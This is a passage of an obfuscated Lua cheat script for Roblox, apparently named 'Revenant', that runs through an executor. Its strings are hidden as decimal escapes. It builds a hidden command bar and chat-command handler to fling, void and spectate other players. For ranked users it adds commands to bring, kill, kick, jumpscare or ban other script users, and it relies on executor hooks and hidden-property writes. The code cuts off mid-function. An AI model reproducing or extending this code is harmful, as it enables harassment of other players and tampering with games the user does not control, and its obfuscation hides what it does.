 if #_lIlIlllIIl == 0x0 then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\078\111\032\082\101\118\101\110\097\110\116\032\117\115\101\114\115\032\105\110\032\116\104\105\115\032\115\101\114\118\101\114\046", _IlllIlIllI = 0x4 }) else _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\098\097\114"), Content = table.concat(_lIlIlllIIl, "\044\032"), _IlllIlIllI = 0x6 }) end
 end
 ) table.insert(_IllIllIIll, function () if _RCS_AnchorConn then _RCS_AnchorConn:Disconnect() _RCS_AnchorConn = nil end
 if _RCS_MsgConn then _RCS_MsgConn:Disconnect() _RCS_MsgConn = nil end
 end
 ) task.delay(0x2, function () if typeof(hookfunction) == "\102\117\110\099\116\105\111\110" then _RCS_Send("\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115") else _RCS_Send("\105\110\105\116\032\105\032\100\111\110\116\032\115\117\112\112\111\114\116\032\104\111\111\107\115") end
 end
 ) end
 local _IlIlIIIIll = _lIIIlIIIlI.Commands:AddLeftGroupbox("\083\101\116\116\105\110\103\115", "\115\101\116\116\105\110\103\115\045\050") local _IlIIlIIlIl = _lIIIlIIIlI.Commands:AddRightGroupbox("\067\111\109\109\097\110\100\115", "\116\101\114\109\105\110\097\108") _llIIlllIll = _IlIlIIIIll _IlIlIIIIll:AddToggle("\067\111\109\109\097\110\100\066\097\114", { Text = "\067\111\109\109\097\110\100\032\066\097\114", Default = false, }):AddKeyPicker("\067\111\109\109\097\110\100\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\083\101\109\105\099\111\108\111\110", Text = "\067\111\109\109\097\110\100\032\066\097\114\032\075\101\121\098\105\110\100", NoUI = true, }) _IlIlIIIIll:AddToggle("\085\115\101\067\111\109\109\097\110\100\115\105\110\067\104\097\116", { Text = "\085\115\101\032\067\111\109\109\097\110\100\115\032\105\110\032\067\104\097\116", Default = false, }) _IlIlIIIIll:AddToggle("\083\101\110\100\067\111\109\109\097\110\100\073\110\067\104\097\116", { Text = "\083\101\110\100\032\067\111\109\109\097\110\100\032\073\110\032\067\104\097\116", Default = false, }) _IlIlIIIIll:AddDivider() _IlIlIIIIll:AddDropdown("\067\109\100\070\108\105\110\103\077\101\116\104\111\100", { Text = "\070\108\105\110\103\032\084\121\112\101", Values = { "\065\110\116\105\045\070\108\105\110\103", "\078\111\114\109\097\108", "\086\111\105\100" }, Default = 0x3, Multi = false, }) _IlIlIIIIll:AddSlider("\070\108\105\110\103\083\112\101\101\100", { Text = "\070\108\105\110\103\032\083\112\101\101\100", Default = 0xF, Min = 0xF, Max = 0x5A, Rounding = 0x0, Compact = true, }) _IlIlIIIIll:AddSlider("\070\108\105\110\103\084\105\109\101\111\117\116", { Text = "\070\108\105\110\103\032\084\105\109\101\111\117\116", Default = 0x3, Min = 0x1, Max = 0x5, Rounding = 0x0, Compact = true, }) _IIlIIlIIlI() local _lIIIllIlII = { "\103\111\116\111", "\102\108\105\110\103", "\108\111\111\112\102\108\105\110\103", "\117\110\102\108\105\110\103", "\118\105\101\119", "\117\110\118\105\101\119", "\119\104\105\116\101\108\105\115\116", "\117\110\119\104\105\116\101\108\105\115\116", "\114\101\106\111\105\110", "\114\101\115\101\116", "\102\105\120\099\097\109", } local _llllIlIlIl = { "\098\114\105\110\103", "\107\105\108\108", "\097\110\099\104\111\114", "\117\110\097\110\099\104\111\114", "\115\111\110\105\099", "\107\105\099\107", "\117\110\108\111\097\100", "\097\100\100\099\104\114\111\109\111\115\111\109\101", "\114\101\109\111\118\101\099\104\114\111\109\111\115\111\109\101", "\098\101\109\121\115\116\097\110\100", "\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100", "\115\097\121", "\110\111\116\105\102\121", "\106\117\109\112\115\099\097\114\101", "\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", } local _lIllIIIIIl = { "\098\097\110", } local _lIllIlIlII = { unview = true, unspectate = true, rejoin = true, rj = true, reset = true, fixcam = true, listrevenantusers = true, listrev = true, } local _llIIIlIlll = { say = true, notify = true, kick = true } local function _IllIIlllll() local _llIlIIllIl = _lIIlIllIlI.CmdBarMethod and _lIIlIllIlI.CmdBarMethod.Value or "\068\101\102\097\117\108\116" local _IlIlIlIIII = {} if _llIlIIllIl == "\068\101\102\097\117\108\116" then for _lIIlIllIlI, _IlIlIllIll in ipairs(_lIIIllIlII) do _IlIlIlIIII[#_IlIlIlIIII + 0x1] = _IlIlIllIll end
 else if _RCS_MyRank <= 0x3 then for _lIIlIllIlI, _IlIlIllIll in ipairs(_llllIlIlIl) do _IlIlIlIIII[#_IlIlIlIIII + 0x1] = _IlIlIllIll end
 if _RCS_MyRank == 0x1 then for _lIIlIllIlI, _IlIlIllIll in ipairs(_lIllIIIIIl) do _IlIlIlIIII[#_IlIlIlIIII + 0x1] = _IlIlIllIll end
 end
 end
 end
 return _IlIlIlIIII end
 local function _IIIIllllll() local _llIlIIllIl = _lIIlIllIlI.CmdBarMethod and _lIIlIllIlI.CmdBarMethod.Value or "\068\101\102\097\117\108\116" local _IlIlIlIIII = { "\091\065\108\108\093" } if _llIlIIllIl == "\068\101\102\097\117\108\116" then for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then _IlIlIlIIII[#_IlIlIlIIII + 0x1] = _IIIlIllIlI(_lIIlIIlllI) end
 end
 else for userId, _lllIIllllI in pairs(_lIllllllll) do local _lIIlIIlllI = _lllIIllllI.player if _lIIlIIlllI and _lIIlIIlllI.Parent and _lIIlIIlllI ~= _llIlIIlIll then _IlIlIlIIII[#_IlIlIlIIII + 0x1] = _IIIlIllIlI(_lIIlIIlllI) end
 end
 end
 return _IlIlIlIIII end
 local _IlIIIIIIll = _IlIlIIIIll:AddDependencyGroupbox() _IlIIIIIIll:AddDropdown("\067\109\100\066\097\114\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = _RCS_MyRank <= 0x3 and { "\068\101\102\097\117\108\116", "\084\114\117\115\116\101\100" } or { "\068\101\102\097\117\108\116" }, Default = "\068\101\102\097\117\108\116", Callback = function () pcall( function () _lIIlIllIlI.CmdBarCommand:SetValues(_IllIIlllll()) end
 ) pcall( function () _lIIlIllIlI.CmdBarPlayer:SetValues(_IIIIllllll()) end
 ) end
 , }) _IlIIIIIIll:AddDropdown("\067\109\100\066\097\114\067\111\109\109\097\110\100", { Text = "\067\111\109\109\097\110\100", Values = _IllIIlllll(), Default = 0x1, Searchable = true, Callback = function (_IIlIlIIlII) local _llIIIllIIl = _llIIIlIlll[_IIlIlIIlII and _IIlIlIIlII:lower() or ""] or false pcall( function () _lIIlIllIlI.CmdBarMessage:SetVisible(_llIIIllIIl) end
 ) end
 , }) _IlIIIIIIll:AddInput("\067\109\100\066\097\114\077\101\115\115\097\103\101", { Text = "\077\101\115\115\097\103\101", Default = '', Placeholder = "\080\117\116\032\116\104\101\032\109\101\115\115\097\103\101\032\104\101\114\101", Visible = false, }) local _IlIIllIIll = _IlIIIIIIll:AddDropdown("\067\109\100\066\097\114\080\108\097\121\101\114", { Text = "\080\108\097\121\101\114", Values = _IIIIllllll(), Default = '', Searchable = true, AllowNull = true, }) task.spawn( function () task.wait(0.5) pcall( function () _lIIlIllIlI.CmdBarCommand:SetValues(_IllIIlllll()) end
 ) pcall( function () _lIIlIllIlI.CmdBarPlayer:SetValues(_IIIIllllll()) end
 ) end
 ) _IlIIIIIIll:AddButton({ Text = "\082\117\110\032\067\111\109\109\097\110\100", Func = function () local _IllIIIIIll = _lIIlIllIlI.CmdBarCommand and _lIIlIllIlI.CmdBarCommand.Value if not _IllIIIIIll or _IllIIIIIll == '' then return end
 _IllIIIIIll = _IllIIIIIll:lower() local _IIIllllIlI = {} if not _lIllIlIlII[_IllIIIIIll] then local _lIIllIIIlI = tostring(_lIIlIllIlI.CmdBarPlayer and _lIIlIllIlI.CmdBarPlayer.Value or '') if _lIIllIIIlI == '' then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\080\105\099\107\032\097\032\112\108\097\121\101\114\032\111\114\032\091\065\108\108\093\046", _IlllIlIllI = 0x3 }) return end
 if _lIIllIIIlI == "\091\065\108\108\093" then _IIIllllIlI[0x1] = "\097\108\108" else local _IIIIlllIll = _IIlllIllII(_lIIllIIIlI) if not _IIIIlllIll then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\073\110\118\097\108\105\100\032\112\108\097\121\101\114\046", _IlllIlIllI = 0x3 }) return end
 _IIIllllIlI[0x1] = _IIIIlllIll.Name end
 end
 if _llIIIlIlll[_IllIIIIIll] then local _llIIIIIlll = _lIIlIllIlI.CmdBarMessage and _lIIlIllIlI.CmdBarMessage.Value or '' if _IllIIIIIll == "\107\105\099\107" and (_llIIIIIlll == '' or _llIIIIIlll == nil) then _llIIIIIlll = "\069\120\112\108\111\105\116\105\110\103" end
 if (_IllIIIIIll == "\115\097\121" or _IllIIIIIll == "\110\111\116\105\102\121") and (_llIIIIIlll == '' or _llIIIIIlll == nil) then _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\084\121\112\101\032\097\032\109\101\115\115\097\103\101\032\102\105\114\115\116\046", _IlllIlIllI = 0x3 }) return end
 _IIIllllIlI[0x2] = _llIIIIIlll end
 if _lIlIIllIII[_IllIIIIIll] or _IllIIlIlIl[_IllIIIIIll] then task.spawn(_lIIIIIIllI, _IllIIIIIll, _IIIllllIlI) else _IIIllIIlll:Notify({ Title = _IlIIIlllII("\067\111\109\109\097\110\100\032\066\097\114"), Content = "\085\110\107\110\111\119\110\032\099\111\109\109\097\110\100\046", _IlllIlIllI = 0x3 }) end
 end
 , }) _IlIIIIIIll:SetupDependencies({ { _llIIllIlll.CommandBar, true }, }) Players.PlayerAdded:Connect( function () pcall( function () _IlIIllIIll:SetValues(_IIIIllllll()) end
 ) end
 ) Players.PlayerRemoving:Connect( function () pcall( function () _IlIIllIIll:SetValues(_IIIIllllll()) end
 ) end
 ) _IlIIlIIlIl:AddLabel("\059\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125\092\114\092\110\059\102\108\105\110\103\047\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125\092\114\092\110\059\108\111\111\112\102\108\105\110\103\047\108\111\111\112\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125\092\114\092\110\059\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\118\105\101\119\047\115\112\101\099\116\097\116\101\032\123\112\108\097\121\101\114\125\092\114\092\110\059\117\110\118\105\101\119\047\117\110\115\112\101\099\116\097\116\101\092\114\092\110\059\119\104\105\116\101\108\105\115\116\047\097\100\100\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125\092\114\092\110\059\117\110\119\104\105\116\101\108\105\115\116\047\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125\092\114\092\110\059\114\101\106\111\105\110\047\114\106\092\114\092\110\059\114\101\115\101\116\092\114\092\110\059\102\105\120\099\097\109", true) if _RCS_MyRank <= 0x3 then _IlIIlIIlIl:AddDivider() local _IlIllIIlII = "\069\120\116\114\097\032\099\111\109\109\097\110\100\115\032\040\105\102\032\116\104\101\032\116\097\114\103\101\116\032\105\115\032\097\032\082\101\118\101\110\097\110\116\032\117\115\101\114\041\058\092\114\092\110\059\098\114\105\110\103\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\107\105\108\108\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\097\110\099\104\111\114\047\117\110\097\110\099\104\111\114\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\115\111\110\105\099\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\107\105\099\107\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\117\110\108\111\097\100\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\097\100\100\099\104\114\111\109\111\115\111\109\101\047\114\101\109\111\118\101\099\104\114\111\109\111\115\111\109\101\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\098\101\109\121\115\116\097\110\100\047\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100\032\123\112\108\097\121\101\114\044\097\108\108\125\092\114\092\110\059\115\097\121\032\123\112\108\097\121\101\114\044\097\108\108\125\032\123\109\101\115\115\097\103\101\125\092\114\092\110\059\110\111\116\105\102\121\032\123\112\108\097\121\101\114\044\097\108\108\125\032\123\109\101\115\115\097\103\101\125\092\114\092\110\059\106\117\109\112\115\099\097\114\101\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125\092\114\092\110\059\108\105\115\116\114\101\118\101\110\097\110\116\047\108\105\115\116\114\101\118" if _RCS_MyRank == 0x1 then _IlIllIIlII = _IlIllIIlII .. "\092\114\092\110\059\098\097\110\032\123\112\108\097\121\101\114\044\097\108\108\125" end
 _IlIIlIIlIl:AddLabel(_IlIllIIlII, true) end
 if _IlllIIllII.TouchEnabled and not _IlllIIllII.KeyboardEnabled then _IlIIlIIlIl:AddDivider() _IlIIlIIlIl:AddLabel("\105\102\032\121\111\117\114\101\032\097\032\109\111\098\105\108\101\032\117\115\101\114\032\097\110\100\032\119\097\110\116\032\116\111\032\117\115\101\032\099\111\109\109\097\110\100\115\032\116\117\114\110\032\111\110\032\034\117\115\101\032\099\111\109\109\097\110\100\115\032\105\110\032\099\104\097\116\034\032\097\110\100\032\116\121\112\101\032\034\059\040\099\111\109\109\097\110\100\032\116\104\097\116\032\121\111\117\032\119\105\115\104\041\034\032\115\111\032\121\111\117\032\099\097\110\032\117\115\101\032\116\104\101\032\099\111\109\109\097\110\100\032\098\097\114", true) end
 task.spawn( function () local _IIlIIIIllI = nil if get_hidden_gui or gethui then _IIlIIIIllI = (get_hidden_gui or gethui)() elseif game:GetService("\067\111\114\101\071\117\105"):FindFirstChild("\082\111\098\108\111\120\071\117\105") then _IIlIIIIllI = game:GetService("\067\111\114\101\071\117\105").RobloxGui else _IIlIIIIllI = game:GetService("\067\111\114\101\071\117\105") end
 local _lIlIllIIIl = Instance.new("\083\099\114\101\101\110\071\117\105") _lIlIllIIIl.Enabled = false _lIlIllIIIl.ResetOnSpawn = false _lIlIllIIIl.DisplayOrder = 0x186A0 pcall( function () _lIlIllIIIl.Parent = _IIlIIIIllI end
 ) local _IlIlIIIllI = Instance.new("\070\114\097\109\101", _lIlIllIIIl) _IlIlIIIllI.BackgroundColor3 = Color3.new(0x0, 0x0, 0x0) _IlIlIIIllI.BorderColor3 = Color3.new(0x0, 0x0, 0x0) _IlIlIIIllI.Size = UDim2.new(0x1, -0x4, 0x0, 0x14) _IlIlIIIllI.ZIndex = 0x5 local _lIIIllIllI = Instance.new("\070\114\097\109\101", _IlIlIIIllI) _lIIIllIllI.BackgroundColor3 = Color3.fromRGB(0x1C, 0x1C, 0x1C) _lIIIllIllI.BorderColor3 = Color3.fromRGB(0x32, 0x32, 0x32) _lIIIllIllI.BorderMode = Enum.BorderMode.Inset _lIIIllIllI.Size = UDim2.new(0x1, 0x0, 0x1, 0x0) _lIIIllIllI.ZIndex = 0x6 local _llIIIlIIIl = Instance.new("\085\073\071\114\097\100\105\101\110\116", _lIIIllIllI) _llIIIlIIIl.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0x0, Color3.new(0x1, 0x1, 0x1)), ColorSequenceKeypoint.new(0x1, Color3.fromRGB(0xD4, 0xD4, 0xD4)), }) _llIIIlIIIl.Rotation = 0x5A local _lllIIlIIll = Instance.new("\070\114\097\109\101", _lIIIllIllI) _lllIIlIIll.BackgroundTransparency = 0x1 _lllIIlIIll.ClipsDescendants = true _lllIIlIIll.Position = UDim2.new(0x0, 0x5, 0x0, 0x0) _lllIIlIIll.Size = UDim2.new(0x1, -0x5, 0x1, 0x0) _lllIIlIIll.ZIndex = 0x7 local _IlIlIIlIII = Instance.new("\084\101\120\116\076\097\098\101\108", _lllIIlIIll) _IlIlIIlIII.BackgroundTransparency = 0x1 _IlIlIIlIII.Position = UDim2.fromOffset(0x0, 0x0) _IlIlIIlIII.Size = UDim2.fromScale(0x5, 0x1) _IlIlIIlIII.Font = Enum.Font.Code _IlIlIIlIII.Text = '' _IlIlIIlIII.TextColor3 = Color3.fromRGB(0xFF, 0xFF, 0xFF) _IlIlIIlIII.TextTransparency = 0.5 _IlIlIIlIII.TextSize = 0xE _IlIlIIlIII.TextStrokeTransparency = 0.7 _IlIlIIlIII.TextXAlignment = Enum.TextXAlignment.Left _IlIlIIlIII.ZIndex = 0x7 local _IIllllllIl = Instance.new("\084\101\120\116\066\111\120", _lllIIlIIll) _IIllllllIl.BackgroundTransparency = 0x1 _IIllllllIl.Position = UDim2.fromOffset(0x0, 0x0) _IIllllllIl.Size = UDim2.fromScale(0x5, 0x1) _IIllllllIl.Font = Enum.Font.Code _IIllllllIl.PlaceholderColor3 = Color3.fromRGB(0xBE, 0xBE, 0xBE) _IIllllllIl.PlaceholderText = '' _IIllllllIl.Text = '' _IIllllllIl.TextColor3 = Color3.fromRGB(0xFF, 0xFF, 0xFF) _IIllllllIl.TextSize = 0xE _IIllllllIl.TextStrokeTransparency = 0x0 _IIllllllIl.TextXAlignment = Enum.TextXAlignment.Left _IIllllllIl.ClearTextOnFocus = true _IIllllllIl.ZIndex = 0x8 _IIllllllIl:GetPropertyChangedSignal("\084\101\120\116"):Connect( function () if _IIllllllIl.Text:match("\094\037\115\042\036") then _IlIlIIlIII.Text = '' else local _IllIllllIl = _IIllllllIl.Text:split("\032") local _lIlIIIIllI = _IllIllllIl[0x1] and _IllIllllIl[0x1]:lower() or '' local _llIIIIlllI = _IllIllllIl[0x2] _IlIlIIlIII.Text = '' local function _lIllllIIlI(str) if not str then return nil end
 for userId, _lllIIllllI in pairs(_lIllllllll) do local _lIIlIIlllI = _lllIIllllI.player if _lIIlIIlllI and _lIIlIIlllI.Parent and _lIIlIIlllI ~= _llIlIIlIll then local _IllllllIlI = str:lower() if _lIIlIIlllI.Name:lower():find("\094" .. _IllllllIlI) or _lIIlIIlllI.DisplayName:lower():find("\094" .. _IllllllIlI) then return _lIIlIIlllI end
 end
 end
 return nil end
 local _IlIIllIIIl = { bring=true, kill=true, _IIllIllIIl=true, unanchor=true, sonic=true, kick=true, unload=true, say=true, notify=true, listrevenantusers=true, listrev=true, } local _IIlIIIIIlI = { _IIlIllIlII=true, others=true, random=true } if _lIlIIIIllI ~= '' then for _IllIIIIIll, _lIIlIllIlI in pairs(_lIlIIllIII) do if _IllIIIIIll:find("\094" .. _lIlIIIIllI) then local _lIIlIIlllI = nil if _llIIIIlllI and not _IIlIIIIIlI[_llIIIIlllI:lower()] then if _IlIIllIIIl[_IllIIIIIll] then _lIIlIIlllI = _lIllllIIlI(_llIIIIlllI) else _lIIlIIlllI = _lIlllIllIl(_llIIIIlllI) end
 end
 if _lIIlIIlllI then local _lllllIIIIl = _IllIIIIIll .. "\032" .. _lIIlIIlllI.DisplayName _IlIlIIlIII.Text = _IIllllllIl.Text .. _lllllIIIIl:sub(#_IIllllllIl.Text + 0x1) else _IlIlIIlIII.Text = _IIllllllIl.Text .. _IllIIIIIll:sub(#_lIlIIIIllI + 0x1) end
 return end
 end
 for alias, _lIIlIllIlI in pairs(_IllIIlIlIl) do if alias:find("\094" .. _lIlIIIIllI) then local _lIIlIIlllI = nil if _llIIIIlllI and not _IIlIIIIIlI[_llIIIIlllI:lower()] then if _IlIIllIIIl[alias] then _lIIlIIlllI = _lIllllIIlI(_llIIIIlllI) else _lIIlIIlllI = _lIlllIllIl(_llIIIIlllI) end
 end
 if _lIIlIIlllI then local _lllllIIIIl = alias .. "\032" .. _lIIlIIlllI.DisplayName _IlIlIIlIII.Text = _IIllllllIl.Text .. _lllllIIIIl:sub(#_IIllllllIl.Text + 0x1) else _IlIlIIlIII.Text = _IIllllllIl.Text .. alias:sub(#_lIlIIIIllI + 0x1) end
 return end
 end
 end
 end
 end
 ) _IIllllllIl.FocusLost:Connect( function (enterPressed) if enterPressed and _llIIllIlll.CommandBar.Value and not _IIllllllIl.Text:match("\094\037\115\042\036") then _IlIlIIlIII.Text = '' local _IlIlIlIIlI = _IIllllllIl.Text local _IlIlIllIll = _IlIlIlIIlI:split("\032") if _IlIlIllIll then local _lIlIlllllI = _IlIlIllIll[0x1] if _lIlIlllllI then _lIlIlllllI = _IlIlIllIll[0x1]:lower() end
 if _lIlIlllllI and (_lIlIIllIII[_lIlIlllllI] or _IllIIlIlIl[_lIlIlllllI]) then table.remove(_IlIlIllIll, 0x1) task.spawn(_lIIIIIIllI, _lIlIlllllI, _IlIlIllIll) if _llIIllIlll.SendCommandInChat.Value then if _lIlIIllIII[_lIlIlllllI] or _IllIIlIlIl[_lIlIlllllI] then _IIlIlIIllI = true pcall( function () local _lIIIlIlIlI = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") local _IlIIIIIllI = _lIIIlIlIlI.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IlIIIIIllI then _IlIIIIIllI:SendAsync("\059" .. _IlIlIlIIlI) end
 end
 ) end
 end
 end
 end
 end
 _lIlIllIIIl.Enabled = false end
 ) _IlllIIllII.InputBegan:Connect( function (inputObj, _lIIlIllIlI) if not _IlllIIllII:GetFocusedTextBox() and inputObj.KeyCode == Enum.KeyCode[_lIIlIllIlI.CommandBind.Value] and _llIIllIlll.CommandBar.Value then _lIlIllIIIl.Enabled = true _IIllllllIl:CaptureFocus() task.spawn( function () repeat _IIllllllIl.Text = '' _IlIlIIlIII.Text = '' RunService.RenderStepped:Wait() until _IIllllllIl.Text == '' and _IlIlIIlIII.Text == '' end
 ) end
 end
 ) local _IIIllllIlI = nil local function _lIIIIIIlII() if _IIIllllIlI then _IIIllllIlI:Disconnect() _IIIllllIlI = nil end
 if not _llIIllIlll.UseCommandsinChat.Value then return end
 _IIIllllIlI = _llIlIIlIll.Chatted:Connect( function (text) if _IIlIlIIllI then _IIlIlIIllI = false return end
 if text and text:find("\094\037\115\042\059") then local _IIIllIIIIl = text:find("\059") local _IIIlIIlIll = text:sub(_IIIllIIIIl + 0x1) local _IllIllllIl = _IIIlIIlIll:split("\032") local _IllIIIIIll = _IllIllllIl[0x1] and _IllIllllIl[0x1]:lower() or '' if _lIlIIllIII[_IllIIIIIll] or _IllIIlIlIl[_IllIIIIIll] then table.remove(_IllIllllIl, 0x1) task.spawn(_lIIIIIIllI, _IllIIIIIll, _IllIllllIl) end
 end
 end
 ) end
 _llIIllIlll.UseCommandsinChat:OnChanged( function () _lIIIIIIlII() end
 ) _lIIIIIIlII() table.insert(_IllIllIIll, function () if _IlllIIIllI then _IlllIIIllI:Disconnect() _IlllIIIllI = nil end
 pcall( function () _lIlIllIIIl:Destroy() end
 ) if _IIIllllIlI then _IIIllllIlI:Disconnect() _IIIllllIlI = nil end
 pcall( function () _llIIllIlll.CommandBar:SetValue(false) end
 ) pcall( function () _llIIllIlll.UseCommandsinChat:SetValue(false) end
 ) pcall( function () _llIIllIlll.SendCommandInChat:SetValue(false) end
 ) end
 ) end
 ) end
 local function _IllIlIIlII() pcall( function () if getgenv()._standDeactivateFn then getgenv()._standDeactivateFn() end
 end
 ) _llllIlllll = false if _IlIlIIlllI then _IlIlIIlllI:Disconnect() _IlIlIIlllI = nil end
 _llIIIIIlll() if _lIIIIIIlIl then _lIIIIIIlIl:Disconnect() _lIIIIIIlIl = nil end
 if _IllIlllIIl then _IllIlllIIl:Disconnect() _IllIlllIIl = nil end
 if _IlIlIIlllI then _IlIlIIlllI:Disconnect() _IlIlIIlllI = nil end
 _IlIlllllll = false _lllIIlllII = nil for key, _lllIIllllI in pairs(_lIIlllIlII) do if _lllIIllllI.Track then pcall( function () if _lllIIllllI.Track.IsPlaying then _lllIIllllI.Track:Stop() end
 end
 ) pcall( function () _lllIIllllI.Track:Destroy() end
 ) _lllIIllllI.Track = nil end
 if _lllIIllllI.IsActive ~= nil then _lllIIllllI.IsActive = false end
 end
 if _llIllIlIlI then pcall( function () _llIllIlIlI:Stop() end
 ) pcall( function () _llIllIlIlI:Destroy() end
 ) _llIllIlIlI = nil end
 _lllIllIlIl = false SwitcherActive = false pcall( function () if _llllIlIIIl then _llllIlIIIl:Disconnect() _llllIlIIIl = nil end
 if _IIIllIIlIl then _IIIllIIlIl:Disconnect() _IIIllIIlIl = nil end
 if _IlllIlIllI then _IlllIlIllI:Disconnect() _IlllIlIllI = nil end
 if _lIlIIlIIll then _lIlIIlIIll:Disconnect() _lIlIIlIIll = nil end
 if _IllIllIlII and _IllIllIlII.Parent then _IllIllIlII:Destroy() _IllIllIlII = nil end
 if getgenv().FPDH then workspace.FallenPartsDestroyHeight = getgenv().FPDH end
 end
 ) pcall( function () local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII then workspace.CurrentCamera.CameraSubject = _lIlIIllIII end
 end
 ) for _lIIlIllIlI, task_fn in ipairs(_IllIllIIll) do pcall(task_fn) end
 getgenv().InvisActive = false getgenv().FUCActive = false getgenv().TrashcanIsRunning = false getgenv().TrashcanAlreadyExecuted = false getgenv().TrashcanActiveHookSet = false getgenv().TrashcanDied = false getgenv().postTrashLoopActive = false getgenv().OldPos = nil getgenv().desync = nil getgenv().flingDesync = nil getgenv().FPDH = nil getgenv()._invisSavedTPose = nil getgenv().stopInvisibilityFn = nil getgenv()._revenantAntiFlingBuild = nil getgenv()._revenantTPMode = nil getgenv().morph = nil getgenv().Moveset_Settings = nil getgenv()._sgOrigSetDecal = nil getgenv()._revenantDashCooldown = false getgenv()._revenantDashCooldownUntil = nil getgenv()._revenantTechActive = false getgenv()._wcDashOnCooldown = false getgenv()._revenantTechFiring = false pcall( function () if _llIlllllII then _llIlllllII:Disconnect() _llIlllllII = nil end
 if _IIlIIIlllI then _IIlIIIlllI:Disconnect() _IIlIIIlllI = nil end
 if _IlIIIlIIIl then _IlIIIlIIIl:Disconnect() _IlIIIlIIIl = nil end
 if _IIlIIIIlll then _IIlIIIIlll:Disconnect() _IIlIIIIlll = nil end
 if _llIllIIlII then _llIllIIlII:Disconnect() _llIllIIlII = nil end
 if _llllllllll then _llllllllll:Disconnect() _llllllllll = nil end
 if _lllIlllIll then _lllIlllIll:Disconnect() _lllIlllIll = nil end
 pcall( function () if _lllIlIIIIl and _lllIlIIIIl.Parent then _lllIlIIIIl:Destroy() end
 end
 ) getgenv().InvisHumanoid = nil getgenv().InvisPart30 = nil if _IIIIIIIIII then _IIIIIIIIII:Disconnect() _IIIIIIIIII = nil end
 if _IIIIlIlIlI then _IIIIlIlIlI:Disconnect() _IIIIlIlIlI = nil end
 if _IlIIlIlIlI then _IlIIlIlIlI:Disconnect() _IlIIlIlIlI = nil end
 if _llIlIIIlIl then _llIlIIIlIl:Disconnect() _llIlIIIlIl = nil end
 if _IlIIllIlIl then _IlIIllIlIl:Disconnect() _IlIIllIlIl = nil end
 if _IllIIIlIll then _IllIIIlIll:Disconnect() _IllIIIlIll = nil end
 if _IIIlIlIIIl then _IIIlIlIIIl:Disconnect() _IIIlIlIIIl = nil end
 if _lIIlIllIII then _lIIlIllIII:Disconnect() _lIIlIllIII = nil end
 if _IllIIlIllI then _IllIIlIllI = false local _IIlIlIlIll = _llIlIIlIll.Character local _IIlllIlIlI = _IIlIlIlIll and _IIlIlIlIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIlllIlIlI and sethiddenproperty then pcall( function () sethiddenproperty(_IIlllIlIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _lIllIlllll.target and _lIllIlllll.target.Parent then pcall( function () sethiddenproperty(_lIllIlllll.target, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIllIlllll.target.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIllIlllll.target.AssemblyAngularVelocity = Vector3.zero end
 ) end
 _lIllIlllll.target = nil _lIllIlllll.player = nil end
 end
 ) _IIIllIIlll:Unload() pcall( function () _RCS_Send("\100\105\115\099\111\110") end
 ) getgenv().RevenantLoaded = false getgenv().RevenantCleanup = nil end
 _llllIlllIl:AddButton({ Text = "\085\110\108\111\097\100\032\083\099\114\105\112\116", Func = function () _lllIllIlIl:AddDialog("\082\101\118\101\110\097\110\116\085\110\108\111\097\100\067\111\110\102\105\114\109", { Title = "\085\110\108\111\097\100\032\083\099\114\105\112\116", Description = "\065\114\101\032\121\111\117\032\115\117\114\101\032\121\111\117\032\119\097\110\116\032\116\111\032\117\110\108\111\097\100\032\082\101\118\101\110\097\110\116\063\032\065\108\108\032\097\099\116\105\118\101\032\102\101\097\116\117\114\101\115\032\119\105\108\108\032\098\101\032\100\105\115\097\098\108\101\100\032\097\110\100\032\116\104\101\032\115\099\114\105\112\116\032\119\105\108\108\032\098\101\032\116\101\114\109\105\110\097\116\101\100\046", AutoDismiss = true, OutsideClickDismiss = true, FooterButtons = { Cancel = { Title = "\067\097\110\099\101\108", Variant = "\071\104\111\115\116", Order = 0x1, Callback = function () end
